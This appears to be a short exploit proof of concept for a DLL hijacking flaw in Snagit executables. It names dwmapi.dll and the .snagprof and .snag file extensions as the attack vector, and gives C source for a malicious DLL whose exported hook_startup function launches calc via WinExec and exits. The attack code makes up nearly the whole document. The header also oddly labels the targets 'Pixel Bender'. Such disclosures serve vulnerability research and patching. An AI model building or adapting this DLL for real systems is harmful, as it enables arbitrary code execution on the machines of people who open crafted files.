---------------------------------------------------------
# Vulnerable: Pixel Bender snagit32.exe & snagiteditor.exe
---------------------------------------------------------
# Vulnerable extensions: .snagprof & .snag
---------------------------------------------------------
# Vulnerable Dll: dwmapi.dll
---------------------------------------------------------
#include <windows.h>
#define DllExport __declspec (dllexport)

DllExport void hook_startup() { exp(); }

int exp()
{
  WinExec("calc", 0);
  exit(0);
  return 0;
}

